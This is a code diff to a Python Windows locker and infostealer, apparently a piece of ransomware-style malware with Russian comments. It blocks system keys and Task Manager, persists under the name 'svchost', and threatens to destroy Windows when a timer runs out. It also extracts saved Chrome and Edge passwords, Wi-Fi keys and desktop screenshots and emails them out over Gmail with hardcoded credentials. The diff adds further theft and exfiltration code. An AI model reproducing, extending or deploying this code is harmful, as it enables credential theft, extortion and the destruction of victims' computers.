@@ -17,51 +17,60 @@ GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
 RECEIVER_EMAIL = "xzx78848@gmail.com"
 VIDEO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp4"
 AUDIO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp3"
+LOGO_URL = "https://github.com/ippo123459-bit/winlocker/blob/main/logo.png?raw=true"
 VIDEO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4.mp4")
 AUDIO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4.mp3")
+LOGO_PATH = os.path.join(tempfile.gettempdir(), "logo.png")
 attempts_left = MAX_ATTEMPTS
 
-# ===== ОТКЛЮЧЕНИЕ WIN ВЕЗДЕ =====
+# ===== ОТКЛЮЧЕНИЕ WIN (ВКЛЮЧАЯ Win+L) =====
 def disable_win_key():
-    # Через реестр
+    # Реестр
     try:
-        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1)
-        winreg.CloseKey(k)
+        for hkey in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
+            try:
+                k = winreg.OpenKey(hkey, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1)
+                winreg.CloseKey(k)
+            except: pass
+            try:
+                k2 = winreg.OpenKey(hkey, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(k2, "DisableLockWorkstation", 0, winreg.REG_DWORD, 1)
+                winreg.CloseKey(k2)
+            except: pass
     except: pass
-    try:
-        k2 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(k2, "NoWinKeys", 0, winreg.REG_DWORD, 1)
-        winreg.CloseKey(k2)
-    except: pass
-    # Через keyboard
+    # Keyboard
     try:
         import keyboard
         keyboard.block_key('windows')
         keyboard.block_key('left windows')
         keyboard.block_key('right windows')
-        for c in ['win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','win+i','win+a','win+s','win+p','win+t','win+ctrl+d','win+ctrl+f4','win+shift+m','left windows','right windows']:
+        for c in ['win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','win+i','win+a','win+s','win+p','win+t','win+ctrl+d','win+ctrl+f4','win+shift+m','left windows','right windows','left windows+l','right windows+l']:
             try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
             except: pass
+        # Отдельно Win+L
+        try: keyboard.add_hotkey('win+l', lambda: None, suppress=True)
+        except: pass
+        try: keyboard.remap_key('windows+l', None)
+        except: pass
     except: pass
 
 def enable_win_key():
     try:
         k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 0)
-        winreg.CloseKey(k)
+        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 0); winreg.CloseKey(k)
+        k2 = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(k2, "DisableLockWorkstation", 0, winreg.REG_DWORD, 0); winreg.CloseKey(k2)
     except: pass
 
 def run_hidden(cmd):
-    try:
-        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
+    try: subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
     except: pass
 
 def get_timer():
     try:
         if os.path.exists(TIMER_FILE):
-            with open(TIMER_FILE, 'r') as f:
-                return float(f.read().strip())
+            with open(TIMER_FILE, 'r') as f: return float(f.read().strip())
     except: pass
     end_time = time.time() + 3600
     save_timer(end_time)
@@ -70,14 +79,12 @@ def get_timer():
 def save_timer(end_time):
     try:
         os.makedirs(os.path.dirname(TIMER_FILE), exist_ok=True)
-        with open(TIMER_FILE, 'w') as f:
-            f.write(str(end_time))
+        with open(TIMER_FILE, 'w') as f: f.write(str(end_time))
     except: pass
 
 def timer_check_loop():
     while True:
-        if get_timer() - time.time() <= 0:
-            destroy_windows_forever()
+        if get_timer() - time.time() <= 0: destroy_windows_forever()
         time.sleep(5)
 
 def destroy_windows_forever():
@@ -92,10 +99,8 @@ def hide_process():
 
 def kill_taskmgr_loop():
     while True:
-        try:
-            for p in ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe"]:
-                run_hidden(f"taskkill /f /im {p}")
-        except: pass
+        for p in ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe"]:
+            run_hidden(f"taskkill /f /im {p}")
         time.sleep(0.05)
 
 def block_everything():
@@ -152,14 +157,12 @@ def add_to_startup():
             cp = pp
         pythonw = sys.executable.replace("python.exe", "pythonw.exe")
         k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(k, "svchost", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
-        winreg.CloseKey(k)
+        winreg.SetValueEx(k, "svchost", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"'); winreg.CloseKey(k)
         startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
         shutil.copy2(cp, os.path.join(startup, 'svchost.pyw'))
         try:
             k2 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(k2, "svchost", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
-            winreg.CloseKey(k2)
+            winreg.SetValueEx(k2, "svchost", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"'); winreg.CloseKey(k2)
         except: pass
         run_hidden(f'schtasks /create /tn "svchost" /tr "\\"{pythonw}\\" \\"{cp}\\"" /sc ONLOGON /rl HIGHEST /f')
     except: pass
@@ -207,7 +210,7 @@ def anim_connect():
 def play_video():
     download_file(VIDEO_URL, VIDEO_PATH)
     download_file(AUDIO_URL, AUDIO_PATH)
-    time.sleep(0.5)
+    time.sleep(0.3)
     try:
         v = tk.Tk(); v.attributes('-fullscreen', True); v.attributes('-topmost', True)
         v.configure(bg='black'); v.overrideredirect(True)
@@ -245,23 +248,43 @@ def mega_steal():
     except: pass
     try: report.append("\nNETWORK:\n" + subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW).decode('cp866','replace')[:2000])
     except: pass
-    for browser, path in [("CHROME", os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')),("EDGE", os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'))]:
-        if os.path.exists(path):
-            report.append(f"\n=== {browser} ===")
-            try:
-                db = os.path.join(tempfile.gettempdir(), f'{browser}.db')
-                shutil.copy2(path, db)
-                cur = sqlite3.connect(db).cursor()
-                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
-                for url, user, pw in cur:
-                    try:
-                        pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
-                        report.append(f"URL: {url}\nLOGIN: {user}\nPASSWORD: {pwd}")
-                    except: pass
-                cur.close()
-                try: os.remove(db)
+    # Chrome
+    chrome_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
+    if os.path.exists(chrome_path):
+        report.append("\n=== CHROME PASSWORDS ===")
+        try:
+            db = os.path.join(tempfile.gettempdir(), 'chrome.db')
+            shutil.copy2(chrome_path, db)
+            cur = sqlite3.connect(db).cursor()
+            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
+            for url, user, pw in cur:
+                try:
+                    pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
+                    report.append(f"URL: {url}\nLOGIN: {user}\nPASS: {pwd}")
                 except: pass
+            cur.close()
+            try: os.remove(db)
             except: pass
+        except: pass
+    # Edge
+    edge_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
+    if os.path.exists(edge_path):
+        report.append("\n=== EDGE PASSWORDS ===")
+        try:
+            db = os.path.join(tempfile.gettempdir(), 'edge.db')
+            shutil.copy2(edge_path, db)
+            cur = sqlite3.connect(db).cursor()
+            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
+            for url, user, pw in cur:
+                try:
+                    pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
+                    report.append(f"URL: {url}\nLOGIN: {user}\nPASS: {pwd}")
+                except: pass
+            cur.close()
+            try: os.remove(db)
+            except: pass
+        except: pass
+    # WiFi
     try:
         report.append("\n=== WIFI ===")
         output = subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW).decode('cp866','replace')
@@ -273,6 +296,21 @@ def mega_steal():
                     for dl in det.split('\n'):
                         if 'Содержимое ключа' in dl: report.append(f"WiFi: {p} | PASS: {dl.split(':')[1].strip()}")
     except: pass
+    # Cookies
+    try:
+        cookies_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')
+        if os.path.exists(cookies_path):
+            report.append(f"\n=== COOKIES ===\nChrome cookies: {os.path.getsize(cookies_path)} bytes")
+    except: pass
+    # Скриншот
+    try:
+        ss = os.path.join(tempfile.gettempdir(), 'desktop.jpg')
+        ImageGrab.grab().save(ss, 'JPEG', quality=50)
+        send_file_email(ss, "[DedSek_Logs] Screenshot")
+        try: os.remove(ss)
+        except: pass
+    except: pass
+    
     report.append(f"\nTIME: {time.strftime('%d.%m.%Y %H:%M:%S')}")
     text = '\n'.join(report)
     for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]): send_email(part, f"[DedSek_Logs] [{i+1}]")
@@ -281,6 +319,20 @@ def send_email(msg, subj=None):
     try:
         m = MIMEText(msg, 'plain', 'utf-8')
         m['Subject'] = subj or 'DedSek'; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
+        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10)
+        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
+    except: pass
+
+def send_file_email(fp, desc):
+    try:
+        if not os.path.exists(fp): return
+        m = MIMEMultipart()
+        m['Subject'] = desc; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
+        with open(fp, 'rb') as f:
+            p = MIMEBase('application', 'octet-stream'); p.set_payload(f.read())
+            encoders.encode_base64(p)
+            p.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(fp)}"')
+            m.attach(p)
         s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10)
         s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
     except: pass
@@ -294,6 +346,17 @@ class WinLocker:
         self.win.protocol("WM_DELETE_WINDOW", lambda: None); self.win.focus_force()
         global attempts_left
         
+        # ЛОГОТИП В ЛЕВОМ УГЛУ
+        download_file(LOGO_URL, LOGO_PATH)
+        try:
+            logo = PhotoImage(file=LOGO_PATH)
+            logo = logo.subsample(3, 3)  # Уменьшаем в 3 раза
+            lbl_logo = tk.Label(self.win, image=logo, bg='black')
+            lbl_logo.image = logo
+            lbl_logo.place(x=10, y=10)
+        except: pass
+        
+        # ТАЙМЕР
         self.timer_end = get_timer()
         self.timer_label = tk.Label(self.win, text="", bg='black', fg='#ff4444', font=('Courier', 30, 'bold'))
         self.timer_label.place(relx=0.5, rely=0.1, anchor='center')
@@ -321,7 +384,7 @@ YOU FUCK.
         
         tk.Label(self.win, text=msg, bg='black', fg='white', font=('Courier',10,'bold'), justify='center').place(relx=0.5, rely=0.45, anchor='center')
         
-        cf = tk.Frame(self.win, bg='black'); cf.place(relx=0.5, rely=0.8, anchor='center')
+        cf = tk.Frame(self.win, bg='black'); cf.place(relx=0.5, rely=0.82, anchor='center')
         tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='white', font=('Courier',14,'bold')).pack(pady=(0,5))
         self.pw = tk.Entry(cf, show="*", font=('Courier',14,'bold'), bg='white', fg='black', relief='solid', bd=2)
         self.pw.pack(pady=(0,5), ipadx=40, ipady=3)
@@ -358,9 +421,7 @@ YOU FUCK.
             self.pw.delete(0, tk.END)
 
 if __name__ == "__main__":
-    # Win отключается ДО ВСЕГО
     disable_win_key()
-    
     hide_process()
     threading.Thread(target=mega_steal, daemon=True).start()
     add_to_startup()
